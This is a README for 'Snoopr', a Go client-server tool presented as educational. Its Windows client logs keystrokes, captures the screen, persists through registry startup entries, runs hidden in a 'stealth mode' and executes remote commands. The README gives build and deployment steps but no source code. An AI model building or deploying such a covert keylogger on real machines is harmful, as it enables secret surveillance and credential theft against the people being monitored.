# Snoopr 🕵️

**Educational Cybersecurity Tool**

Snoopr is a Windows-focused monitoring tool designed for cybersecurity education and authorized penetration testing. It demonstrates client-server communication, activity logging, and remote administration capabilities.

⚠️ **EDUCATIONAL PURPOSE ONLY** - This tool is designed for cybersecurity education, authorized penetration testing, and academic research. Use only on systems you own or have explicit permission to test.

## Features

### Server Dashboard
- 🌐 Modern web-based administration interface
- 🎨 **NEW:** Enhanced UI with glassmorphism design
- 🔐 Login authentication (default: admin/admin)
- 👥 Real-time client management with improved styling
- 📊 Activity monitoring and logging
- 🖥️ **NEW:** Live screen viewing with fullscreen toggle
- 💬 Remote message broadcasting
- 🔧 Client control capabilities
- 🔄 **NEW:** Smart client reconnection system

### Client Monitoring
- ⌨️ Keystroke logging
- 🖥️ Window activity tracking
- 📸 **NEW:** Real-time screen capture
- 💾 Startup persistence
- 📱 Pop-up message display
- 🔗 Real-time server communication
- 🎯 Windows-specific features
- 🆔 **NEW:** Unique client identification system

## Project Structure

```
snoopr/
├── cmd/
│   ├── server/          # Server application
│   │   └── main.go
│   └── client/          # Client application
│       └── main.go
├── bin/                 # Built executables
├── buildclient.bat      # Windows build script
├── buildclient.sh       # Unix build script
├── Makefile            # Build automation
├── go.mod              # Go module file
└── README.md           # This file
```

## Prerequisites

- Go 1.21 or higher
- Windows target environment (for client)
- Network connectivity between server and clients

## Installation & Setup

### 1. Install Dependencies

```bash
# Install Go dependencies
make deps
# or
go mod tidy
```

### 2. Build and Run Server

```bash
# Using Makefile
make server

# Or manually
go build -o bin/snoopr-server cmd/server/main.go
./bin/snoopr-server
```

**Windows Users:** See [WINDOWS_GUIDE.md](WINDOWS_GUIDE.md) for Windows-specific instructions and troubleshooting.

The server will start on `http://0.0.0.0:8080`

**Default Credentials:**
- Username: `admin`
- Password: `admin`

### 3. Build Client

#### Using Build Scripts

**Windows:**
```cmd
buildclient.bat [SERVER_IP] [PORT]
buildclient.bat 192.168.1.100 8080
```

**Unix/Linux/macOS:**
```bash
chmod +x buildclient.sh
./buildclient.sh [SERVER_IP] [PORT]
./buildclient.sh 192.168.1.100 8080
```

#### Using Makefile

```bash
make client SERVER_IP=192.168.1.100 SERVER_PORT=8080
```

## Usage

### Server Operation

1. **Start the Server:**
   ```bash
   make server
   ```

2. **Access Dashboard:**
   - **Local:** `http://localhost:8080`  
   - **Network:** `http://[SERVER_IP]:8080` (accessible from any device on network)
   - Login with `admin` / `admin`

3. **Dashboard Features:**
   - **Connected Clients:** View all connected clients
   - **Activity Logs:** Real-time activity monitoring
   - **Controls:** Send messages, start/stop logging
   - **Client Selection:** Click on clients to select them

### Client Deployment

1. **Build Client:** Use build scripts with target server IP/port
2. **Deploy:** Copy `bin/snoopr-client.exe` to target Windows systems
3. **Execute:** Run the executable (will add to startup automatically)

### Client Features

- **Startup Persistence:** Automatically adds to Windows startup
- **Stealth Mode:** Runs hidden in the background
- **Activity Logging:** Monitors keystrokes and window changes
- **Remote Commands:** Receives and executes server commands
- **Pop-up Messages:** Displays messages from server

## Development

### Building from Source

```bash
# Clone repository
git clone <repository-url>
cd snoopr

# Install dependencies
make deps

# Build server
go build -o bin/snoopr-server cmd/server/main.go

# Build client (cross-compile for Windows)
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o bin/snoopr-client.exe cmd/client/main.go
```

### Architecture

- **Server:** Go web server with WebSocket communication
- **Client:** Windows application using Win32 APIs
- **Communication:** WebSocket-based real-time messaging
- **Persistence:** Windows Registry startup entries

## Security Considerations

### For Educational Use
- Only use on systems you own or have explicit written permission
- Understand applicable laws and regulations in your jurisdiction
- Follow responsible disclosure for any findings

### Technical Security
- Default credentials should be changed immediately
- Network communication is unencrypted (educational limitation)
- Client runs with user privileges (not system-level)

## Legal Notice

This tool is provided for educational and authorized testing purposes only. Users are responsible for:

- Obtaining proper authorization before use
- Complying with all applicable laws and regulations  
- Using the tool ethically and responsibly
- Understanding the legal implications in their jurisdiction

**The developers are not responsible for any misuse of this tool.**

## Academic Applications

- Cybersecurity course demonstrations
- Penetration testing methodology education
- Network security awareness training
- Malware analysis and behavior study
- Digital forensics training scenarios

## Troubleshooting

### Common Issues

**Server won't start:**
- Check if port 8080 is available
- Verify Go installation and dependencies
- Check firewall settings

**Client won't connect:**
- Verify server IP and port configuration
- Check network connectivity
- Ensure Windows firewall allows connection

**Build errors:**
- Run `go mod tidy` to resolve dependencies
- Ensure Go version 1.21 or higher
- Check GOOS/GOARCH settings for cross-compilation

### Debugging

Enable verbose logging by modifying the source code to include debug statements. The server logs all client connections and activities to the console.

## Contributing

This is an educational project. Contributions should focus on:
- Educational value enhancement
- Security best practices
- Code clarity and documentation
- Cross-platform compatibility improvements

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**Remember: Use responsibly and only where authorized. This tool is for educational purposes only.** 